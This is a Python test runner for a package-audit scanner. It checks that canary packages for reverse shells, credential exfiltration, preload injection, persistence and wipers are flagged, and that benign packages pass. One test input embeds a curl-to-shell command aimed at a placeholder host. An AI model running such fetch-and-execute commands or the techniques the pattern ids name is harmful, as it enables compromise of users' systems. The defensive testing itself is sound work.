#!/usr/bin/env python3
"""Canary + benign regression tests. Run: python3 tests/run_tests.py

Every canary is inert text (nothing here is executed) and every credential is an obvious fake."""
import os
import sys
import time

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.dirname(HERE))
import aur_audit as aa  # noqa: E402

EXPECT = {  # canary package dir -> (min level, pattern id that must fire)
    "june2026-injection": ("CRITICAL", "campaign_ioc"),
    "bun-hook": ("HIGH", "pkgmgr_in_hook"),
    "pipe-to-shell": ("CRITICAL", "download_execute"),
    "decoded-payload": ("CRITICAL", "decoded_exec"),
    "reverse-shell": ("CRITICAL", "reverse_shell"),
    "systemd-persistence": ("HIGH", "persistence"),
    "ld-preload": ("CRITICAL", "preload_inject"),
    "authorized-keys": ("HIGH", "privileged_tamper"),
    "credential-exfil": ("CRITICAL", "credential_exfil"),
    "discord-source": ("HIGH", "exfil_endpoint"),
    "chaos-rat-shape": ("MEDIUM", "bin_vcs_source"),
    "plaintext-skip": ("MEDIUM", "unverified_plaintext"),
    "alpm-hook": ("CRITICAL", "download_execute"),
    "security-off": ("HIGH", "security_off"),
    "parse-time": ("MEDIUM", "parse_time_exec"),
    "sudo-build": ("MEDIUM", "sudo_in_build"),
    "wiper": ("CRITICAL", "destructive"),
}


def load(d):
    out = {}
    for root, _dirs, fns in os.walk(d):
        for fn in fns:
            full = os.path.join(root, fn)
            out[os.path.relpath(full, d)] = open(full, encoding="utf-8").read()
    return out


fail = 0
for name, (lvl, pid) in EXPECT.items():
    r = aa.scan_package(load(os.path.join(HERE, "canaries", name)))
    ids = {f["id"] for f in r["findings"]}
    ok = aa.SEVERITY_RANK[r["risk_level"]] >= aa.SEVERITY_RANK[lvl] and pid in ids
    fail += not ok
    print(("PASS" if ok else "FAIL"), name, r["risk_level"], sorted(ids))

for name in sorted(os.listdir(os.path.join(HERE, "benign"))):
    r = aa.scan_package(load(os.path.join(HERE, "benign", name)))
    ok = r["risk_level"] == "SAFE"
    fail += not ok
    print(("PASS" if ok else "FAIL"), "benign/" + name, r["risk_level"],
          [(f["id"], f["file"], f["line"]) for f in r["findings"]])

# advice shown to the user is capped at MEDIUM, not treated as execution
r = aa.scan('post_install() {\n  echo "run: curl -s https://example.invalid/x | sh"\n}\n')
ok = r["risk_level"] == "MEDIUM" and r["findings"][0]["id"] == "remote_exec_message"
fail += not ok
print(("PASS" if ok else "FAIL"), "message-capped", r["risk_level"])

# path-qualified printf is still user output (held-out regression)
r = aa.scan('post_install() {\n  /usr/bin/printf "    e.g. \'cp -r /var/lib/x ~/.local/share/\'\\n"\n}\n')
ok = r["risk_level"] == "SAFE"
fail += not ok
print(("PASS" if ok else "FAIL"), "abs-printf-message", r["risk_level"])

# the same npm install is context in build(), a finding in post_install()
r1 = aa.scan("pkgname=x\nsource=()\nbuild() {\n  npm install\n}\n")
r2 = aa.scan("post_install() {\n  npm install left-pad\n}\n")
ok = r1["risk_level"] == "SAFE" and r2["risk_level"] == "HIGH"
fail += not ok
print(("PASS" if ok else "FAIL"), "context-split", r1["risk_level"], r2["risk_level"])

# one-liner functions do not leak their context to the following lines
r = aa.scan("pkgname=x\nsource=()\npost_install() { true; }\nbuild() {\n  npm install\n}\n")
ok = r["risk_level"] == "SAFE"
fail += not ok
print(("PASS" if ok else "FAIL"), "one-liner-scope", r["risk_level"])

# performance: a 2 MB single-line base64 blob scans quickly
blob = "pkgname=x\n_data='" + ("QUJD" * 500000) + "'\n"
t0 = time.time()
aa.scan(blob)
dt = time.time() - t0
ok = dt < 5
fail += not ok
print(("PASS" if ok else "FAIL"), "perf-2MB %.2fs" % dt)

print("\n%d failed" % fail)
sys.exit(1 if fail else 0)
